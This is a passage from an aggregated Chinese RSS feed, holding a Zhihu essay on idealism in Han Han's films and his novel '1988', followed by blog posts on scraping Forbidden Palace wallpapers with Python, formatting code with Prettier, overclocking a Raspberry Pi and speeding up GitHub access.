data-private-watermark-src=\"v2-4917e48826b8970588f1d21722c79252\"></p>\n<p>而在结尾，韩寒模糊掉了现实与非现实的边界，在一个似现实、却又过于梦幻的世界中，宣示了理想主义者江河的成功，让一片暖色调光晕中的东极岛重回原初，而江河则徜徉于其中。并且，韩寒也让相对的现实主义者马浩瀚，在结尾念出他为江河的书写的文艺序言，让马浩瀚与江河的心灵构成了“呼应回响”---被现实压倒的马浩瀚，同样怀有理想主义。这个结尾，让理想主义得到了再一次的宣扬。哪怕它分明是非现实的遐想，但却切实地存在于每个人——认清现实力量的人——的脑海之中，不可抹除。</p>\n<p>而在韩寒后续的电影作品里，这样的主题与氛围，基本上得到了通贯到底的执行延续。《乘风破浪》中，赛车手回到了过去，但开解他与父亲心结的，却不是他对于父亲潜在苦心的了解，也自然不是随之而生的自我改变，而是他从父亲身上感受的坚持信心，反而坚定了原本的理想信念。他曾经不理解的是父亲为何任性妄为入狱而没有照顾好母亲，但在穿越之中，他触摸到了父亲性格中的积极一面，也随之逐渐了解了对于原初自我的坚持。母亲爱上的正是这样一个父亲，父亲也从未改变照顾兄弟的义气性格，否则爱情根本无从开始。</p>\n<p>而在结尾，胆怯的小马成为了“马化腾”，更是完美的点题——各人的自我都是不必“优化改变”的自我，各有归宿，各自安好，各生欢喜。而赛车手与父亲的和解，也恰恰来自于此：他对于赛车不顾反对的坚持，让同样坚持自己的父亲感到了共鸣，于是他与父亲在“父亲不改变”的母亲身亡上和解，父亲则与他在“他不改变”的赛车职业上和解。哪怕，周遭的现实，是冷酷的亲人离世、未明的事业远景。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-695c31fb8f0e2af8b1861bb72c7ea707_720w.jpg?rss\" data-rawwidth=\"2500\" data-rawheight=\"1875\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-695c31fb8f0e2af8b1861bb72c7ea707\" data-watermark-src=\"v2-0e94c4ac1b6ac7f4172ca9c5eec327b6\" data-private-watermark-src=\"v2-6c7c9a54c4dce0fc087633f2488a51c1\"></p>\n<p>而《飞驰人生》的结尾来临时，熟悉的气息也再次扑面而来。韩寒依旧是韩寒，他对理想主义的宣扬、对“现实不能让我屈服”的精神胜利的赞许，仍然创造了一个效果上佳的高潮。主角的车飞上高空，完成了主角梦寐以求的“飞驰”，而他也赢得了比赛，实现了自己的理想，即使在现实层面上等待他的将是车毁人亡。他并非不知道现实的模样，在闪回的交代中可以看到，他早就感受到了世态炎凉，否则也不会说出“我们的时代已经过去了，对吧年轻人”这样的话。但是即使如此，他依然认为“靠纯粹的热爱，才能赢得比赛”，与其说他认为这能带他走向现实层面的成功，不如说他从心里不愿意改变。</p>\n<p>结尾的飞机和动画，是张弛儿子的想象或者是回忆，深层次来说，则是张驰“用热爱来赢得一切”的理想主义在精神层面的胜利。但是，在现实层面上，张驰一定是车毁人亡了的。这种车毁人亡，实际上也代表着他的理想主义在现实层面的必然结局。这在此前的电影中，也已经有所展示：张驰是在几乎融不到资，拿不到好车的情况下，用自己的热情和理想强行支撑，从而勉强达到了比赛的资格。</p>\n<p>与其说他战胜了现实，不如说是他在被现实打败这一必然结局下的最后燃烧。但是，电影将他的身影停留在了飞上天空的一瞬，仿佛他真正摆脱了物质的世俗纠缠打压，获得了理想腾飞的自由。这种混合着现实打压与理想升腾的信息，正是韩寒的母题——认清现实，但依然坚守理想，并歌颂这种坚守。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e968928647ae14c7ce9d1f85369a46b5_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e968928647ae14c7ce9d1f85369a46b5\" data-watermark-src=\"v2-f366571883336ab7c0ad04ffff36ec81\" data-private-watermark-src=\"v2-e0ebb906473dee1669befaa29e8594b7\"></p>\n<p>由此可见，韩寒的创作，拥有一个高度个性、且在电影创作中愈发圆润老练的表达主题。这也与他本人在现实中的作风保持着一致：接受包装与营销，却不在内容上含糊，坚持自己的独特风格，保持技巧的学习，但却不改变散化结构、段子玩梗，更不会修改意境氛围；而在生活中，他更是多面的，社交玩转的同时，又有着明显无法得到大众认同的极度自由爱情观、以及相对应的“对责任感的认知”。</p>\n<p>他无疑是高度个人化、作者性的创作者，也完全有能力、有意愿用作品来表达自我。这让韩寒的作品有了丰富的独特性——腔调、意境、情绪、节奏、结构、叙述、母题。</p>\n<p>而这也正是《1988 我想和这个世界谈谈》，最期待被影视化的核心理由。</p>\n<p>韩寒的文学作品并不少，但对他脑海中的一切实现度最完美、完成度最高分的，或许就是这部作品了。单以结尾的处理而论，我们就能看到这一点。</p>\n<p>此前，韩寒多采取戛然而止的方式。像《一座城池》里，便让那座脱离现实感、人们行为逻辑诡异的“理想王国”爆炸，并且让男主角感到背后抱上的手，听到那句“你是害怕了吗，还是别的什么”，终于接收到爱情的宽慰，让理想的破灭与再萌芽交织，而后突兀砍断故事，将一切停留在这里。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c8d1e2a7a3fb50b653985085765af520_720w.jpg?rss\" data-rawwidth=\"699\" data-rawheight=\"512\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c8d1e2a7a3fb50b653985085765af520\" data-watermark-src=\"v2-085e959fcbaaedea881d4a4fa646da2d\" data-private-watermark-src=\"v2-c1d97d991ef0e7a610d9b1c3374122a8\"></p>\n<p>而《1988》，却有所不同。我们能看到一个非常完整的结尾，让一切线索收归一处，完成交代：女主角妓女的下落，以及开篇中提出的“接朋友”之剧情主线（类比《后会无期》里江河等人的“前往支教”），都有了确切的承接收束。同时，情感的表达上，韩寒也给出了一个绝对意义上的全篇制高点，以情绪和主题的双重升华，结束作品。</p>\n<p>可以说，《1988》中的韩寒，难得地在小说的范畴里，找到了实现自我创作构想的高完成度途径，而不再只是灵感断裂一般的草草收场。在本作中，我们几乎可以找到一切韩寒标志性的东西，甚至清晰地看到一些《后会无期》的痕迹——妓女的浪漫，明确的“出发前往某目的地”的主线动机。而且，它们以一种极其紧密且明确的方式，结合到了一起。这让它的电影改编难度，必然低于评分极低的《一座城池》与《长安乱》。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-04a69e533f9cbee933d0442ce61e3a0f_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"427\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-04a69e533f9cbee933d0442ce61e3a0f\" data-watermark-src=\"v2-339da41f81c36c9b39500b0f5a0c9501\" data-private-watermark-src=\"v2-609be030210f64b4d9cf3cc4473b2fdc\"></p>\n<p>以下，是这部小说的结尾，至少个人而言，是让人只能全部黏贴转载之程度的优秀，无法被缩写、简述、概论。</p>\n<p><i>我带着一个属于全世界的孩子上路了。站在我故乡那条国道尽头的友谊桥上，在稀薄的空气里，从凌晨开始等待，我从不凝望过往的每一台汽车。1988的点烟器烧坏了，我向一个路过的司机借了火，但我不想在这个时刻再和任何陌生人言语，所以我只能一支接着一支抽烟，那火光才不会断去。自然的，我站在车外。几个小时后，香火终于断了，我俯身进车，捏了一把小家伙的脸说，我找找烟。打开了汽车的扶手箱，我掏到了在最深处的一个小玩意，取出来发现那是一只录音笔，我搜寻记忆，才想起那是娜娜扔在这台车里的。它躺在这里面已经两年，我按下播放键，居然还有闪烁着的最后一格电，娜娜轻唱着摇篮曲，我不知道是不是空气越稀薄，声音便传越远，还是空气稀薄的地方一定没有人烟和喧闹，我总觉得这轻微的声音在山谷里来回飘荡，我将录音笔拿起来，放在小女孩耳边，说，你妈。她兴奋地乱抓，突然间，歌声戛然而止，传来三下轻促的敲击化妆台的声音，然后是另外一个女声说道，娜娜，接客了。在娜娜回着哦的同时，这段录音结束了。我连忙抽回录音笔，观察着小家伙的表情，她似乎有所察觉，放下了小爪子疑惑地看着我。我将录音内容倒回到被中断前的最后一声歌声，然后按下录音键，摇下窗户，我想山谷里的风雨声可以洗掉那些对话，覆盖了十多秒以后，我把手从窗外抽了回来，刚要按下结束，小家伙突然对着录音笔喊了一声“咦”，然后录音笔自己没电了。这是她第一次正儿八经说话，我曾一度害怕她不能言语。这第一声，她既不喊爸爸，也未喊妈妈，只是对着这个世界抛下了一个疑问。</i></p>\n<p><i>天将黑的时候，我发动了1988，掉转车头，向东而去，如果它能够不抛锚，那么我离开海岸线还有五千公里。如果它抛锚了，那么海岸线离开我还有五千公里。也许我会在那里结识一个姑娘，有一段美好的时光。那会是一个全新的地方。但我至少等待过，我知道你从不会来，但我从不怀疑你彼时的真心，就如同我的每一个谎言都是真心的。但这一次，我至少是勇敢的，我承认的朋友们也会赞许我的行为，因为他们都会是这样的人，你也许会为我流泪，但也许心中会说，你太蠢了。</i></p>\n<p><i>天全黑的时候，我停下了1988，小家伙正在熟睡，今天她居然没有哭泣。我从后座拿出了一个袋子，里面便是1988制造者的骨灰，在我心中，里面还有丁丁哥哥，10号，刘茵茵，我将他们撒在了风里。马上我知道了迎风撒东西是多傻的事，我身上沾满了他们的骨灰。我拍了拍衣服，想那又如何，反正我也是被他们笼罩着的人，他们先行，我替他们收拾着因为跑太快从口袋里跌落的扑克牌，我始终跑在他们划破的气流里，不过我也不曾觉得风阻会减小一些，只是他们替我撞过了每一堵我可能要撞的高墙，摔落了每一道我可能要落进的沟壑，然后告诉我，这条路没有错，继续前行吧，但是你已经用掉了一次帮助的机会，再见了朋友。</i></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a7f8d5aa329a17a7c2229f552f27aa3c_720w.jpg?rss\" data-rawwidth=\"440\" data-rawheight=\"415\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a7f8d5aa329a17a7c2229f552f27aa3c\" data-watermark-src=\"v2-321dfd71e7721ebde6978564c1fa26b6\" data-private-watermark-src=\"v2-bb2f9af2f00940ad71e27cb5952a5d78\"></p>\n<p>韩寒在这部小说的通篇，都贯彻了他标志性的“理想国”氛围——一种似乎与现实脱离开的，荒诞而肆意的世界。而在小说结尾，韩寒才揭示了全书的真实：仿佛逍遥骑士一般的赴约之旅，不过是领回友人的骨灰，而与主角仿佛建立起纯爱关系、又进入了母亲角色的妓女，也终究回到属于自己的日常中。现实在最后终于露出了獠牙，撕毁了通篇的乌托邦。</p>\n<p>但正是有了现实的显露，才让结尾中短暂的“理想国”有了更丰富的含义。它不是脱离于客观世界的存在，而是根植于其中。在残酷而又冷漠的现实世界中，能够拥有这样的短暂乌托邦，才是最珍贵的事情——就像回荡起妓女歌声的瞬间，正因为随即而至的“接客了”，才显得格外地静谧而崇高。而这种微妙的氛围、信仰的闪烁，也正是《后会无期》里陈乔恩的抬首、王珞丹的漫步，带给我们的体验，很难被量化、转述、模仿，是属于韩寒的个人性特质，以及他的先天触觉。</p>\n<p>韩寒在结尾告诉我们：即使身处现实的残酷，也要坚守内心的理想，即使明知世界的真相，也要守住自己的信念。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-14aa34b844450a22dc97d3fd9f1b8567_720w.jpg?rss\" data-rawwidth=\"630\" data-rawheight=\"860\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-14aa34b844450a22dc97d3fd9f1b8567\" data-watermark-src=\"v2-b35ad4167e0cee0935bdf893abefb793\" data-private-watermark-src=\"v2-42cdf78a5e5c3b0068c549f647236ed5\"></p>\n<p>这或许也正是他本人的经历体会——离开中学时老师的“忠告”，写出作品时周遭的非议，投身赛车时的“玩票”，多年持续中的“打假”，结婚生子后“妥协”的质疑。而随着年龄的增长，他本人也确实有了很多对成人世界的倾泻与言和——不接广告原则的打破，更少的矜持，更多的商业。</p>\n<p>但即便如此，韩寒内心中最本质的坚持，或许从未改变——于一片风雨中，自我不疑。因此，他才写出了最后的一段，给徐浪，给所有能够被他称之为、也愿意视他为“朋友”的同路人，也给他自己：拍了拍衣服，想那又如何，反正我也是被他们笼罩着的人，他们先行，我替他们收拾着因为跑太快从口袋里跌落的扑克牌，我始终跑在他们划破的气流里，不过我也不曾觉得风阻会减小一些，只是他们替我撞过了每一堵我可能要撞的高墙，摔落了每一道我可能要落进的沟壑，然后告诉我，这条路没有错，继续前行吧，但是你已经用掉了一次帮助的机会，再见了朋友。</p>\n<p>事实上，在他的很多作品中，我们都能多少读出这样的表达。《一座城池》中“非现实国度”伴随着爆炸的破灭与拥抱软语的“梦想照进现实”。《后会无期》中理想主义者江河于宛若现实梦想中间地带的一片光晕中的人生圆满，以及现实主义者马浩瀚“你永远不知道，那就是最后一句”的文艺吟诵。《飞驰人生》中飞向悬崖的赛车手。现实与理想的冲突，现实与理想的共存，是这些作品共同的主题。</p>\n<p>但是，《1988》，是其中完成度最高，或许也是最接近韩寒构想中表达效果的一部。正如书名——站在成人阶段的韩寒，想以积累后的自我，与这个现实世界谈一谈。</p>\n<p>只有它，让现实中光芒乍现的乌托邦一瞬，变得神圣而万物不侵。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/segelas?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">segelas</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484472016/answer/2106503781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">22 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/472426257?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你看过的书或影视剧中，你觉得最惨的人是谁?</a><br><a href=\"http://www.zhihu.com/question/36660279?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些影视剧高于原著，比原著更值得看？</a><br>\n","link":"http://www.zhihu.com/question/484472016/answer/2106503781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"好用的app","date":"2021-09-06 08:49:21","description":"\n<p>airdroid是android手机上比较好用的app</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-zhong-meng-96?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梦中梦丶</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/56821134?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 